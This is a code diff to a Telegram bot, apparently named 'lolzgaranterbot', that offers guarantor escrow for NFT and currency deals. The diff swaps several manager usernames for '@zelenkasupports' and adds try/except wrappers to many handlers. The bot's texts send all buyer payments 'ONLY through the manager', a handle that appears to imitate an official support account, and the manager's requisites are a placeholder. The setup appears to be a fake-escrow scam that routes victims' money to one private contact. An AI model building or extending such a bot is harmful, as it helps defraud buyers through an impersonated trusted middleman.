@@ -140,6 +140,10 @@ def generate_deal_code():
 REF_LINK_USER = "https://t.me/lolzgaranterbot?start=ref_{user_id}"
 DEAL_LINK_TEMPLATE = "https://t.me/lolzgaranterbot?start=deal_{code}"
 
+# Менеджер – заменён на @zelenkasupports
+MANAGER_USERNAME = "@zelenkasupports"
+MANAGER_REQUISITES = f"Реквизиты менеджера: {MANAGER_USERNAME} (заглушка)"
+
 TEXTS = {
     'ru': {
         'welcome': (
@@ -148,7 +152,7 @@ TEXTS = {
             f"— <b>Автоматические сделки</b> с NFT и валютами\n"
             f"— {EMOJI_SHIELD} <b>Полная защита</b> обеих сторон\n"
             f"— {EMOJI_MONEY} <b>Реферальная программа</b> — <i>50% от комиссии</i>\n"
-            f"— {EMOJI_PACKAGE} <b>Передача товаров</b> через менеджера: @LZSupp</blockquote>\n\n"
+            f"— {EMOJI_PACKAGE} <b>Передача товаров</b> через менеджера: {MANAGER_USERNAME}</blockquote>\n\n"
             f"{EMOJI_MEGAPHONE} <b>Канал:</b> @LiveLolz"
         ),
         'lang_prompt': f"<b>{EMOJI_GLOSSARY} Выберите язык:</b>",
@@ -238,7 +242,7 @@ TEXTS = {
         'logs_header': f"{EMOJI_GLOSSARY} Логи действий:\n\n",
         'logs_empty': "Логов пока нет.",
         'logs_entry': "{{time}} | {{user}} | {{action}} | {{data}}",
-        'support_contact': f"{EMOJI_SHIELD} Техподдержка\n\nСвяжитесь с нашим менеджером:\n@boyfrer",
+        'support_contact': f"{EMOJI_SHIELD} Техподдержка\n\nСвяжитесь с нашим менеджером:\n{MANAGER_USERNAME}",
         'requisites_title': f"{EMOJI_PIN} <b>Мои реквизиты</b>",
         'requisites_body': (
             f"<blockquote>{EMOJI_DIAMOND} <b>TON-кошелёк:</b>\n"
@@ -334,7 +338,7 @@ TEXTS = {
             f"Реквизиты менеджера для оплаты: {{manager_requisites}}\n"
             f"Завершённых сделок у продавца: {{seller_deals}}\n"
             f"</blockquote>\n\n"
-            f"{EMOJI_SHIELD} Вся оплата проходит ТОЛЬКО через менеджера @Iank. Не переводите средства напрямую продавцу!\n"
+            f"{EMOJI_SHIELD} Вся оплата проходит ТОЛЬКО через менеджера {MANAGER_USERNAME}. Не переводите средства напрямую продавцу!\n"
             f"Проверьте реквизиты перед оплатой!\n\n"
             f"Ожидайте оплаты от покупателя. После получения оплаты нажмите «Я передал подарок»."
         ),
@@ -381,7 +385,7 @@ TEXTS = {
             f"— <b>Automated deals</b> with NFTs and currencies\n"
             f"— {EMOJI_SHIELD} <b>Full protection</b> for both parties\n"
             f"— {EMOJI_MONEY} <b>Referral program</b> — <i>50% of fee</i>\n"
-            f"— {EMOJI_PACKAGE} <b>Goods transfer</b> via manager: @LZSupp</blockquote>\n\n"
+            f"— {EMOJI_PACKAGE} <b>Goods transfer</b> via manager: {MANAGER_USERNAME}</blockquote>\n\n"
             f"{EMOJI_MEGAPHONE} <b>Channel:</b> @LiveLolz"
         ),
         'lang_prompt': f"<b>{EMOJI_GLOSSARY} Select language:</b>",
@@ -471,7 +475,7 @@ TEXTS = {
         'logs_header': f"{EMOJI_GLOSSARY} Action logs:\n\n",
         'logs_empty': "No logs yet.",
         'logs_entry': "{{time}} | {{user}} | {{action}} | {{data}}",
-        'support_contact': f"{EMOJI_SHIELD} Support\n\nContact our manager:\n@boyfrer",
+        'support_contact': f"{EMOJI_SHIELD} Support\n\nContact our manager:\n{MANAGER_USERNAME}",
         'requisites_title': f"{EMOJI_PIN} <b>My requisites</b>",
         'requisites_body': (
             f"<blockquote>{EMOJI_DIAMOND} <b>TON wallet:</b>\n"
@@ -567,7 +571,7 @@ TEXTS = {
             f"Manager requisites for payment: {{manager_requisites}}\n"
             f"Seller completed deals: {{seller_deals}}\n"
             f"</blockquote>\n\n"
-            f"{EMOJI_SHIELD} All payments go ONLY through the manager @Iank. Do not transfer funds directly to the seller!\n"
+            f"{EMOJI_SHIELD} All payments go ONLY through the manager {MANAGER_USERNAME}. Do not transfer funds directly to the seller!\n"
             f"Check the requisites before payment!\n\n"
             f"Wait for payment from the buyer. After receiving payment, click «I sent the gift»."
         ),
@@ -719,36 +723,40 @@ async def cmd_rzzteam(message: types.Message):
 @dp.callback_query(lambda c: c.data == "ref")
 async def cb_referrals(callback: types.CallbackQuery):
     logging.info("✅ Обработчик ref (рефералы) вызван")
-    user_id = callback.from_user.id
-    ref_text = get_text(user_id, 'referral')
-    ref_link = get_ref_link(user_id)
-    ref_text = ref_text.replace(REF_LINK_USER, ref_link)
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text=get_text(user_id, 'copy_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_COPY, callback_data="copy_ref")],
-        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
-    ])
-    await send_with_banner(callback, ref_text, keyboard)
-    await callback.answer()
+    try:
+        user_id = callback.from_user.id
+        ref_text = get_text(user_id, 'referral')
+        ref_link = get_ref_link(user_id)
+        ref_text = ref_text.replace(REF_LINK_USER, ref_link)
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text=get_text(user_id, 'copy_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_COPY, callback_data="copy_ref")],
+            [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
+        ])
+        await send_with_banner(callback, ref_text, keyboard)
+    except Exception as e:
+        logging.error(f"Ошибка в ref: {e}")
+    finally:
+        await callback.answer()
     log_action(user_id, "referrals", "просмотр рефералов")
 
 @dp.callback_query(lambda c: c.data == "new_deal")
 async def cb_create(callback: types.CallbackQuery, state: FSMContext):
     logging.info("✅ Обработчик new_deal (создать сделку) вызван")
-    await callback.answer()
-    user_id = callback.from_user.id
-    await state.clear()
-    await state.set_state(CreateDealStates.role)
-    text = get_text(user_id, 'create_role')
-    if not text:
-        logging.error("❌ Текст create_role пустой")
-        await callback.message.answer("Ошибка: текст не найден")
-        return
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Я продавец", icon_custom_emoji_id=CUSTOM_EMOJI_ROCKET, callback_data="role_seller")],
-        [InlineKeyboardButton(text="Я покупатель", icon_custom_emoji_id=CUSTOM_EMOJI_MONEY, callback_data="role_buyer")],
-        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
-    ])
     try:
+        await callback.answer()
+        user_id = callback.from_user.id
+        await state.clear()
+        await state.set_state(CreateDealStates.role)
+        text = get_text(user_id, 'create_role')
+        if not text:
+            logging.error("❌ Текст create_role пустой")
+            await callback.message.answer("Ошибка: текст не найден")
+            return
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="Я продавец", icon_custom_emoji_id=CUSTOM_EMOJI_ROCKET, callback_data="role_seller")],
+            [InlineKeyboardButton(text="Я покупатель", icon_custom_emoji_id=CUSTOM_EMOJI_MONEY, callback_data="role_buyer")],
+            [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
+        ])
         await callback.message.answer(text, parse_mode="HTML", reply_markup=keyboard)
     except Exception as e:
         logging.error(f"❌ Ошибка при отправке сообщения: {e}")
@@ -757,55 +765,63 @@ async def cb_create(callback: types.CallbackQuery, state: FSMContext):
 @dp.callback_query(lambda c: c.data == "balance")
 async def cb_balance(callback: types.CallbackQuery):
     logging.info("✅ Обработчик balance вызван")
-    user_id = callback.from_user.id
-    balance = get_user_balance(user_id)
-    frozen = get_frozen_balance(user_id)
-    completed = get_user_completed_deals(user_id)
-    if balance == 0 and frozen == 0:
-        balance_text = get_text(user_id, 'balance_empty')
-    else:
-        balance_text = get_text(user_id, 'balance_amount').format(amount=balance)
-    frozen_text = ""
-    if frozen > 0:
-        frozen_text = get_text(user_id, 'frozen_amount').format(amount=frozen) + "\n"
-    text = (
-        f"{get_text(user_id, 'balance_title')}\n\n"
-        f"{balance_text}\n"
-        f"{frozen_text}"
-        f"{get_text(user_id, 'completed_deals').format(completed=completed)}\n\n"
-        f"{get_text(user_id, 'withdraw_need')}"
-    )
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text=get_text(user_id, 'withdraw_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_WITHDRAW, callback_data="withdraw")],
-        [InlineKeyboardButton(text=get_text(user_id, 'transactions_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_TRANSACT, callback_data="transactions")],
-        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
-    ])
-    await send_with_banner(callback, text, keyboard)
-    await callback.answer()
+    try:
+        user_id = callback.from_user.id
+        balance = get_user_balance(user_id)
+        frozen = get_frozen_balance(user_id)
+        completed = get_user_completed_deals(user_id)
+        if balance == 0 and frozen == 0:
+            balance_text = get_text(user_id, 'balance_empty')
+        else:
+            balance_text = get_text(user_id, 'balance_amount').format(amount=balance)
+        frozen_text = ""
+        if frozen > 0:
+            frozen_text = get_text(user_id, 'frozen_amount').format(amount=frozen) + "\n"
+        text = (
+            f"{get_text(user_id, 'balance_title')}\n\n"
+            f"{balance_text}\n"
+            f"{frozen_text}"
+            f"{get_text(user_id, 'completed_deals').format(completed=completed)}\n\n"
+            f"{get_text(user_id, 'withdraw_need')}"
+        )
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text=get_text(user_id, 'withdraw_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_WITHDRAW, callback_data="withdraw")],
+            [InlineKeyboardButton(text=get_text(user_id, 'transactions_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_TRANSACT, callback_data="transactions")],
+            [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
+        ])
+        await send_with_banner(callback, text, keyboard)
+    except Exception as e:
+        logging.error(f"Ошибка в balance: {e}")
+    finally:
+        await callback.answer()
     log_action(user_id, "balance", "просмотр баланса")
 
 @dp.callback_query(lambda c: c.data == "deals")
 async def cb_deals(callback: types.CallbackQuery):
     logging.info("✅ Обработчик deals вызван")
-    user_id = callback.from_user.id
-    deals = user_deals.get(user_id, [])
-    total = len(deals)
-    completed = sum(1 for d in deals if d.get('status') == 'completed')
-    stats = get_text(user_id, 'deals_stats').format(total=total, completed=completed)
-    text = f"<b>{get_text(user_id, 'deals_title')}</b>\n\n<blockquote>{stats}</blockquote>"
-    if deals:
-        items = []
-        for d in deals[:5]:
-            items.append(f"#{d['code']}")
-        text += "\n" + "\n".join(items)
-    else:
-        text += "\n" + get_text(user_id, 'deals_list_empty')
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text=get_text(user_id, 'search_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_SEARCH, callback_data="search_deal")],
-        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
-    ])
-    await send_with_banner(callback, text, keyboard)
-    await callback.answer()
+    try:
+        user_id = callback.from_user.id
+        deals = user_deals.get(user_id, [])
+        total = len(deals)
+        completed = sum(1 for d in deals if d.get('status') == 'completed')
+        stats = get_text(user_id, 'deals_stats').format(total=total, completed=completed)
+        text = f"<b>{get_text(user_id, 'deals_title')}</b>\n\n<blockquote>{stats}</blockquote>"
+        if deals:
+            items = []
+            for d in deals[:5]:
+                items.append(f"#{d['code']}")
+            text += "\n" + "\n".join(items)
+        else:
+            text += "\n" + get_text(user_id, 'deals_list_empty')
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text=get_text(user_id, 'search_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_SEARCH, callback_data="search_deal")],
+            [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
+        ])
+        await send_with_banner(callback, text, keyboard)
+    except Exception as e:
+        logging.error(f"Ошибка в deals: {e}")
+    finally:
+        await callback.answer()
     log_action(user_id, "deals", "просмотр сделок")
 
 class DealSearch(StatesGroup):
@@ -813,10 +829,14 @@ class DealSearch(StatesGroup):
 
 @dp.callback_query(lambda c: c.data == "search_deal")
 async def cb_search_deal(callback: types.CallbackQuery, state: FSMContext):
-    user_id = callback.from_user.id
-    await callback.message.answer(get_text(user_id, 'search_prompt'))
-    await state.set_state(DealSearch.waiting_code)
-    await callback.answer()
+    try:
+        user_id = callback.from_user.id
+        await callback.message.answer(get_text(user_id, 'search_prompt'))
+        await state.set_state(DealSearch.waiting_code)
+    except Exception as e:
+        logging.error(f"Ошибка в search_deal: {e}")
+    finally:
+        await callback.answer()
 
 @dp.message(DealSearch.waiting_code)
 async def process_search_code(message: Message, state: FSMContext):
@@ -875,46 +895,70 @@ async def show_requisites(target, user_id: int):
 
 @dp.callback_query(lambda c: c.data == "requisites")
 async def cb_requisites(callback: types.CallbackQuery):
-    user_id = callback.from_user.id
-    await show_requisites(callback, user_id)
-    await callback.answer()
+    try:
+        user_id = callback.from_user.id
+        await show_requisites(callback, user_id)
+    except Exception as e:
+        logging.error(f"Ошибка в requisites: {e}")
+    finally:
+        await callback.answer()
     log_action(user_id, "requisites", "просмотр реквизитов")
 
 # ---------- Редактирование реквизитов ----------
 @dp.callback_query(lambda c: c.data == "edit_ton")
 async def edit_ton(callback: types.CallbackQuery, state: FSMContext):
-    user_id = callback.from_user.id
-    await state.set_state(RequisitesEdit.waiting_ton)
-    await callback.message.answer(get_text(user_id, 'requisites_edit_prompt').format(field="TON-кошелёк"))
-    await callback.answer()
+    try:
+        user_id = callback.from_user.id
+        await state.set_state(RequisitesEdit.waiting_ton)
+        await callback.message.answer(get_text(user_id, 'requisites_edit_prompt').format(field="TON-кошелёк"))
+    except Exception as e:
+        logging.error(f"Ошибка в edit_ton: {e}")
+    finally:
+        await callback.answer()
 
 @dp.callback_query(lambda c: c.data == "edit_card")
 async def edit_card(callback: types.CallbackQuery, state: FSMContext):
-    user_id = callback.from_user.id
-    await state.set_state(RequisitesEdit.waiting_card)
-    await callback.message.answer(get_text(user_id, 'requisites_edit_prompt').format(field="карта (16 цифр)"))
-    await callback.answer()
+    try:
+        user_id = callback.from_user.id
+        await state.set_state(RequisitesEdit.waiting_card)
+        await callback.message.answer(get_text(user_id, 'requisites_edit_prompt').format(field="карта (16 цифр)"))
+    except Exception as e:
+        logging.error(f"Ошибка в edit_card: {e}")
+    finally:
+        await callback.answer()
 
 @dp.callback_query(lambda c: c.data == "edit_stars")
 async def edit_stars(callback: types.CallbackQuery, state: FSMContext):
-    user_id = callback.from_user.id
-    await state.set_state(RequisitesEdit.waiting_stars)
-    await callback.message.answer(get_text(user_id, 'requisites_edit_prompt').format(field="Stars (@username)"))
-    await callback.answer()
+    try:
+        user_id = callback.from_user.id
+        await state.set_state(RequisitesEdit.waiting_stars)
+        await callback.message.answer(get_text(user_id, 'requisites_edit_prompt').format(field="Stars (@username)"))
+    except Exception as e:
+        logging.error(f"Ошибка в edit_stars: {e}")
+    finally:
+        await callback.answer()
 
 @dp.callback_query(lambda c: c.data == "edit_usdt")
 async def edit_usdt(callback: types.CallbackQuery, state: FSMContext):
-    user_id = callback.from_user.id
-    await state.set_state(RequisitesEdit.waiting_usdt)
-    await callback.message.answer(get_text(user_id, 'requisites_edit_prompt').format(field="USDT (TRC20 адрес)"))
-    await callback.answer()
+    try:
+        user_id = callback.from_user.id
+        await state.set_state(RequisitesEdit.waiting_usdt)
+        await callback.message.answer(get_text(user_id, 'requisites_edit_prompt').format(field="USDT (TRC20 адрес)"))
+    except Exception as e:
+        logging.error(f"Ошибка в edit_usdt: {e}")
+    finally:
+        await callback.answer()
 
 @dp.callback_query(lambda c: c.data == "edit_btc")
 async def edit_btc(callback: types.CallbackQuery, state: FSMContext):
-    user_id = callback.from_user.id
-    await state.set_state(RequisitesEdit.waiting_btc)
-    await callback.message.answer(get_text(user_id, 'requisites_edit_prompt').format(field="BTC-адрес"))
-    await callback.answer()
+    try:
+        user_id = callback.from_user.id
+        await state.set_state(RequisitesEdit.waiting_btc)
+        await callback.message.answer(get_text(user_id, 'requisites_edit_prompt').format(field="BTC-адрес"))
+    except Exception as e:
+        logging.error(f"Ошибка в edit_btc: {e}")
+    finally:
+        await callback.answer()
 
 @dp.message(RequisitesEdit.waiting_ton)
 async def process_ton(message: Message, state: FSMContext):
@@ -989,100 +1033,185 @@ async def process_btc(message: Message, state: FSMContext):
 # ---------- Язык ----------
 @dp.callback_query(lambda c: c.data == "lang")
 async def cb_lang(callback: types.CallbackQuery):
-    user_id = callback.from_user.id
-    text = get_text(user_id, 'lang_prompt')
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text=f"{get_text(user_id, 'lang_ru')}", callback_data="lang_ru"),
-         InlineKeyboardButton(text=f"{get_text(user_id, 'lang_en')}", callback_data="lang_en")],
-        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
-    ])
-    await send_with_banner(callback, text, keyboard)
-    await callback.answer()
+    try:
+        user_id = callback.from_user.id
+        text = get_text(user_id, 'lang_prompt')
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text=f"{get_text(user_id, 'lang_ru')}", callback_data="lang_ru"),
+             InlineKeyboardButton(text=f"{get_text(user_id, 'lang_en')}", callback_data="lang_en")],
+            [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
+        ])
+        await send_with_banner(callback, text, keyboard)
+    except Exception as e:
+        logging.error(f"Ошибка в lang: {e}")
+    finally:
+        await callback.answer()
 
 @dp.callback_query(lambda c: c.data.startswith("lang_"))
 async def cb_lang_set(callback: types.CallbackQuery):
-    user_id = callback.from_user.id
-    lang_code = callback.data.split("_")[1]
-    user_lang[user_id] = lang_code
-    await send_main_menu(callback, user_id)
-    await callback.answer()
+    try:
+        user_id = callback.from_user.id
+        lang_code = callback.data.split("_")[1]
+        user_lang[user_id] = lang_code
+        await send_main_menu(callback, user_id)
+    except Exception as e:
+        logging.error(f"Ошибка в lang_set: {e}")
+    finally:
+        await callback.answer()
     log_action(user_id, "lang_change", f"язык {lang_code}")
 
 # ---------- Поддержка ----------
 @dp.callback_query(lambda c: c.data == "support")
 async def cb_support(callback: types.CallbackQuery):
-    user_id = callback.from_user.id
-    text = get_text(user_id, 'support_contact')
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
-    ])
-    await send_with_banner(callback, text, keyboard)
-    await callback.answer()
+    try:
+        user_id = callback.from_user.id
+        text = get_text(user_id, 'support_contact')
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
+        ])
+        await send_with_banner(callback, text, keyboard)
+    except Exception as e:
+        logging.error(f"Ошибка в support: {e}")
+    finally:
+        await callback.answer()
 
 # ---------- Назад ----------
 @dp.callback_query(lambda c: c.data == "back_to_menu")
 async def cb_back_to_menu(callback: types.CallbackQuery):
-    user_id = callback.from_user.id
-    await send_main_menu(callback, user_id)
-    await callback.answer()
+    try:
+        user_id = callback.from_user.id
+        await send_main_menu(callback, user_id)
+    except Exception as e:
+        logging.error(f"Ошибка в back_to_menu: {e}")
+    finally:
+        await callback.answer()
 
 @dp.callback_query(lambda c: c.data == "create_back")
 async def create_back(callback: types.CallbackQuery, state: FSMContext):
-    user_id = callback.from_user.id
-    await state.clear()
-    await send_main_menu(callback, user_id)
-    await callback.answer()
+    try:
+        user_id = callback.from_user.id
+        await state.clear()
+        await send_main_menu(callback, user_id)
+    except Exception as e:
+        logging.error(f"Ошибка в create_back: {e}")
+    finally:
+        await callback.answer()
 
 # ---------- Копирование реферальной ссылки ----------
 @dp.callback_query(lambda c: c.data == "copy_ref")
 async def cb_copy_ref(callback: types.CallbackQuery):
-    user_id = callback.from_user.id
-    ref_link = get_ref_link(user_id)
-    await callback.answer(f"{ref_link}", show_alert=True)
+    try:
+        user_id = callback.from_user.id
+        ref_link = get_ref_link(user_id)
+        await callback.answer(f"{ref_link}", show_alert=True)
+    except Exception as e:
+        logging.error(f"Ошибка в copy_ref: {e}")
+    finally:
+        await callback.answer()
     log_action(user_id, "copy_ref", "копирование реферальной ссылки")
 
 # ---------- Обработчики этапов создания сделки ----------
 @dp.callback_query(lambda c: c.data.startswith("role_"))
 async def process_role(callback: types.CallbackQuery, state: FSMContext):
     logging.info("✅ Обработчик role_ вызван")
-    await callback.answer()
-    user_id = callback.from_user.id
-    role = callback.data.split("_")[1]
-    await state.update_data(role=role)
+    try:
+        await callback.answer()
+        user_id = callback.from_user.id
+        role = callback.data.split("_")[1]
+        await state.update_data(role=role)
 
-    if role == 'buyer':
-        await state.set_state(CreateDealStates.payment_method)
-        text = get_text(user_id, 'create_payment')
-        keyboard = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="Карта", icon_custom_emoji_id=CUSTOM_EMOJI_CARD_BTN, callback_data="pay_card")],
-            [InlineKeyboardButton(text="Stars", icon_custom_emoji_id=CUSTOM_EMOJI_STARS_BTN, callback_data="pay_stars")],
-            [InlineKeyboardButton(text="Крипта", icon_custom_emoji_id=CUSTOM_EMOJI_USDT, callback_data="pay_crypto")],
-            [InlineKeyboardButton(text="Назад", icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="create_back")],
-            [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
-        ])
-        await callback.message.answer(text, parse_mode="HTML", reply_markup=keyboard)
-    else:  # seller
-        await state.set_state(CreateDealStates.currency)
-        text = get_text(user_id, 'create_currency')
-        keyboard = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="RUB", callback_data="cur_RUB")],
-            [InlineKeyboardButton(text="UAH", callback_data="cur_UAH")],
-            [InlineKeyboardButton(text="KZT", callback_data="cur_KZT")],
-            [InlineKeyboardButton(text="BYN", callback_data="cur_BYN")],
-            [InlineKeyboardButton(text="Назад", icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="create_back")],
-            [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
-        ])
-        await callback.message.answer(text, parse_mode="HTML", reply_markup=keyboard)
+        if role == 'buyer':
+            await state.set_state(CreateDealStates.payment_method)
+            text = get_text(user_id, 'create_payment')
+            keyboard = InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="Карта", icon_custom_emoji_id=CUSTOM_EMOJI_CARD_BTN, callback_data="pay_card")],
+                [InlineKeyboardButton(text="Stars", icon_custom_emoji_id=CUSTOM_EMOJI_STARS_BTN, callback_data="pay_stars")],
+                [InlineKeyboardButton(text="Крипта", icon_custom_emoji_id=CUSTOM_EMOJI_USDT, callback_data="pay_crypto")],
+                [InlineKeyboardButton(text="Назад", icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="create_back")],
+                [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
+            ])
+            await callback.message.answer(text, parse_mode="HTML", reply_markup=keyboard)
+        else:  # seller
+            await state.set_state(CreateDealStates.currency)
+            text = get_text(user_id, 'create_currency')
+            keyboard = InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="RUB", callback_data="cur_RUB")],
+                [InlineKeyboardButton(text="UAH", callback_data="cur_UAH")],
+                [InlineKeyboardButton(text="KZT", callback_data="cur_KZT")],
+                [InlineKeyboardButton(text="BYN", callback_data="cur_BYN")],
+                [InlineKeyboardButton(text="Назад", icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="create_back")],
+                [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
+            ])
+            await callback.message.answer(text, parse_mode="HTML", reply_markup=keyboard)
+    except Exception as e:
+        logging.error(f"Ошибка в process_role: {e}")
+        try:
+            await callback.message.answer("Произошла ошибка. Попробуйте позже.")
+        except:
+            pass
 
 @dp.callback_query(lambda c: c.data.startswith("pay_"))
 async def process_payment(callback: types.CallbackQuery, state: FSMContext):
     logging.info("✅ Обработчик pay_ вызван")
-    await callback.answer()
-    user_id = callback.from_user.id
-    method = callback.data.split("_")[1]
-    await state.update_data(payment_method=method)
+    try:
+        await callback.answer()
+        user_id = callback.from_user.id
+        method = callback.data.split("_")[1]
+        await state.update_data(payment_method=method)
 
-    if method == 'card':
+        if method == 'card':
+            await state.set_state(CreateDealStates.currency)
+            text = get_text(user_id, 'create_currency')
+            keyboard = InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="RUB", callback_data="cur_RUB")],
+                [InlineKeyboardButton(text="UAH", callback_data="cur_UAH")],
+                [InlineKeyboardButton(text="KZT", callback_data="cur_KZT")],
+                [InlineKeyboardButton(text="BYN", callback_data="cur_BYN")],
+                [InlineKeyboardButton(text="Назад", icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="create_back")],
+                [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
+            ])
+            await callback.message.answer(text, parse_mode="HTML", reply_markup=keyboard)
+        else:
+            await state.update_data(currency='USD' if method == 'crypto' else 'Stars')
+            await state.set_state(CreateDealStates.amount)
+            await ask_amount(callback, user_id, state)
+    except Exception as e:
+        logging.error(f"Ошибка в process_payment: {e}")
+
+@dp.callback_query(lambda c: c.data.startswith("cur_"))
+async def process_currency(callback: types.CallbackQuery, state: FSMContext):
+    logging.info("✅ Обработчик cur_ вызван")
+    try:
+        await callback.answer()
+        user_id = callback.from_user.id
+        currency = callback.data.split("_")[1]
+        await state.update_data(currency=currency)
+        await state.set_state(CreateDealStates.amount)
+        await ask_amount(callback, user_id, state)
+    except Exception as e:
+        logging.error(f"Ошибка в process_currency: {e}")
+
+async def ask_amount(target, user_id: int, state: FSMContext):
+    logging.info("✅ ask_amount вызван")
+    try:
+        data = await state.get_data()
+        currency = data.get('currency', 'RUB')
+        text = get_text(user_id, 'create_amount').format(currency=currency)
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="Изменить валюту", icon_custom_emoji_id=CUSTOM_EMOJI_MONEY, callback_data="change_currency")],
+            [InlineKeyboardButton(text="Назад", icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="create_back")],
+            [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
+        ])
+        await target.message.answer(text, parse_mode="HTML", reply_markup=keyboard)
+    except Exception as e:
+        logging.error(f"Ошибка в ask_amount: {e}")
+
+@dp.callback_query(lambda c: c.data == "change_currency")
+async def change_currency(callback: types.CallbackQuery, state: FSMContext):
+    logging.info("✅ change_currency вызван")
+    try:
+        await callback.answer()
+        user_id = callback.from_user.id
         await state.set_state(CreateDealStates.currency)
         text = get_text(user_id, 'create_currency')
         keyboard = InlineKeyboardMarkup(inline_keyboard=[
@@ -1094,53 +1223,12 @@ async def process_payment(callback: types.CallbackQuery, state: FSMContext):
             [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
         ])
         await callback.message.answer(text, parse_mode="HTML", reply_markup=keyboard)
-    else:
-        await state.update_data(currency='USD' if method == 'crypto' else 'Stars')
-        await state.set_state(CreateDealStates.amount)
-        await ask_amount(callback, user_id, state)
-
-@dp.callback_query(lambda c: c.data.startswith("cur_"))
-async def process_currency(callback: types.CallbackQuery, state: FSMContext):
-    logging.info("✅ Обработчик cur_ вызван")
-    await callback.answer()
-    user_id = callback.from_user.id
-    currency = callback.data.split("_")[1]
-    await state.update_data(currency=currency)
-    await state.set_state(CreateDealStates.amount)
-    await ask_amount(callback, user_id, state)
-
-async def ask_amount(target, user_id: int, state: FSMContext):
-    logging.info("✅ ask_amount вызван")
-    data = await state.get_data()
-    currency = data.get('currency', 'RUB')
-    text = get_text(user_id, 'create_amount').format(currency=currency)
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Изменить валюту", icon_custom_emoji_id=CUSTOM_EMOJI_MONEY, callback_data="change_currency")],
-        [InlineKeyboardButton(text="Назад", icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="create_back")],
-        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
-    ])
-    await target.message.answer(text, parse_mode="HTML", reply_markup=keyboard)
-
-@dp.callback_query(lambda c: c.data == "change_currency")
